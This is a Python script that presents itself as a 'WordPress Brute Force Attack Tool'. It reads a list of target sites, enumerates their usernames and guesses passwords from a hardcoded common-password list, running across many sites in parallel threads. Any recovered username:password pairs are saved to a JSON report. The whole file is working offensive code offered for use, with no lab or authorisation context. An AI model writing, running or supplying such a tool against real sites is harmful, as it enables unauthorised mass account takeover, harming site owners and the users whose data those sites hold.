import time
import json
import argparse
import sys
from modules.user_enum import enumerate_usernames
from modules.brute_force import brute_force_login
from modules.alive_checker import is_site_alive
from colorama import Fore, init
from concurrent.futures import ThreadPoolExecutor

init(autoreset=True)

# Common password list
passwords = [
    "123456", "123456789", "admin123", "password", "letmein", "12345678", "qwerty",
    "12345", "123123", "admin", "welcome", "pass@123", "root", "1234", "000000",
    "qwerty123", "1q2w3e4r", "abc123", "123qwe", "iloveyou", "dragon", "letmein123",
    "wordpress", "wpadmin", "superadmin", "pass1234", "test123", "admin@123",
    "user", "login", "admin1", "administrator", "adminadmin"
]

def load_sites(filename="sites_list.txt"):
    try:
        with open(filename, "r") as f:
            return list(set([line.strip().rstrip("/") for line in f if line.strip()]))
    except:
        print(Fore.RED + "[!] Could not load sites.")
        return []

def save_report(results, filename="brute_force_report.json"):
    with open(filename, "w") as f:
        json.dump(results, f, indent=4)
    print(Fore.GREEN + f"[✓] Results saved to {filename}")

def brute_force_site(site, verbose=False):
    result = {"site": site, "status": "failed"}
    
    if verbose:
        print(Fore.CYAN + f"\n[+] Checking site: {site}")
    if not is_site_alive(site):
        if verbose:
            print(Fore.RED + "[-] Site not alive. Skipping.")
        return result

    usernames = enumerate_usernames(site)
    if not usernames:
        if verbose:
            print(Fore.YELLOW + "[!] No usernames found.")
        return result

    if verbose:
        print(Fore.BLUE + f"[~] Usernames found: {', '.join(usernames)}")
    
    user, pwd = brute_force_login(site, usernames, passwords, verbose=verbose)
    if user:
        result.update({"user": user, "password": pwd, "status": "success"})
        print(Fore.GREEN + f"[💥] Brute-force success → {user}:{pwd}")
    else:
        if verbose:
            print(Fore.LIGHTBLACK_EX + "[x] Brute-force failed.")

    return result

def main():
    parser = argparse.ArgumentParser(
        description="🔥 WordPress Brute Force Automation Tool 🔥",
        epilog="Example: python brute_force_all.py --threads 10 --verbose --save-json",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    parser.add_argument("--threads", type=int, default=5, help="Number of threads to use")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("--save-json", action="store_true", help="Save results to brute_force_report.json")
    parser.add_argument("--target", type=str, help="Scan a single target site directly")
    args = parser.parse_args()

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    print(Fore.MAGENTA + "\n★ WP Brute Force Attack Tool ★\n")

    results = []

    if args.target:
        site = args.target.strip().rstrip("/")
        result = brute_force_site(site, args.verbose)
        results.append(result)
    else:
        sites = load_sites()
        if not sites:
            print(Fore.RED + "[!] No sites found in sites_list.txt")
            return

        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            futures = [executor.submit(brute_force_site, site, args.verbose) for site in sites]
            for future in futures:
                result = future.result()
                results.append(result)

    if args.save_json:
        save_report(results)

if __name__ == "__main__":
    main()
